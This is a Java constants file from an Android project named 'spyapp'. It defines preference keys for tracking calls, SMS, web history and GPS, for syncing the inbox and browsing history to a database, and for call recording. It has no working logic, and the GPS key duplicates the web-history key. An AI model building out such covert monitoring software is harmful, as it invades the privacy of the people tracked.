package com.example.spyapp.util;

public class Const {

	public static String PreferencesName="TrackingPreferences";
	public static String callSwitchPref="CallSwitchPref";
	public static String smsSwitchPref="SMSSwitchPref";
	public static String webSwitchHistPref="WebSwitchPref";
	public static String gpsSwitchHistPref="WebSwitchPref";
	
	public static String isInboxSybcToSypeDatabase="InboxSybcToSypeDatabase";
	public static String isWebHistorySybcToSypeDatabase="WebHistorySybcToSypeDatabase";
	
	public static String callRecordingFormatPref="CallRecFormatPref";
	public static String callRecordingDirectionPref="CallRecDirectionPref";
	
	
	public static final String TAG = "Call recorder: ";

	public static final String FILE_DIRECTORY = "recordedCalls";
	public static final String LISTEN_ENABLED = "ListenEnabled";
	public static final String FILE_NAME_PATTERN = "^d[\\d]{14}p[_\\d]*\\.3gp$";

	public static final int MEDIA_MOUNTED = 0;
	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
	public static final int NO_MEDIA = 2;

	public static final int STATE_INCOMING_NUMBER = 1;
	public static final int STATE_CALL_START = 2;
	public static final int STATE_CALL_END = 3;
	public static final int STATE_START_RECORDING = 4;
	public static final int STATE_STOP_RECORDING = 5;
	public static final int RECORDING_ENABLED = 6;
	public static final int RECORDING_DISABLED = 7;
	
}
